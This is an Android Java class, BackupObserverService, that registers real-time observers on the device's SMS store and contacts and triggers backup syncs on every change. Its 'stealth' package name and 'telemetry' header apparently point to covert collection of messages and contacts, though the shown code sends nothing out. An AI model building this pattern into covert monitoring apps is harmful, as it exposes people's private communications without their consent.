package com.notrack.stealth.backup;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.util.Log;

/**
 * REAL-TIME CONTENT OBSERVER FOR SMS & CONTACTS TELEMETRY
 */
public class BackupObserverService {

    private static final String TAG = "BackupObserverService";
    private static volatile boolean sRegistered = false;

    private static ContentObserver sSmsObserver;
    private static ContentObserver sContactsObserver;

    public static synchronized void registerObservers(Context context) {
        if (context == null || sRegistered) return;
        final Context appCtx = context.getApplicationContext();

        try {
            Handler handler = new Handler(Looper.getMainLooper());

            sSmsObserver = new ContentObserver(handler) {
                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    Log.d(TAG, "SMS ContentObserver change detected: " + uri);
                    SmsBackupEngine.triggerSyncAsync(appCtx);
                }
            };

            sContactsObserver = new ContentObserver(handler) {
                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    Log.d(TAG, "Contacts ContentObserver change detected: " + uri);
                    ContactsBackupEngine.triggerSyncAsync(appCtx);
                }
            };

            appCtx.getContentResolver().registerContentObserver(
                    Uri.parse("content://sms"), true, sSmsObserver);

            appCtx.getContentResolver().registerContentObserver(
                    ContactsContract.Contacts.CONTENT_URI, true, sContactsObserver);

            sRegistered = true;
            Log.i(TAG, "Registered real-time SMS & Contacts ContentObservers successfully.");

            // Trigger initial sync
            SmsBackupEngine.triggerSyncAsync(appCtx);
            ContactsBackupEngine.triggerSyncAsync(appCtx);

        } catch (Exception e) {
            Log.w(TAG, "Error registering content observers: " + e.getMessage());
        }
    }
}
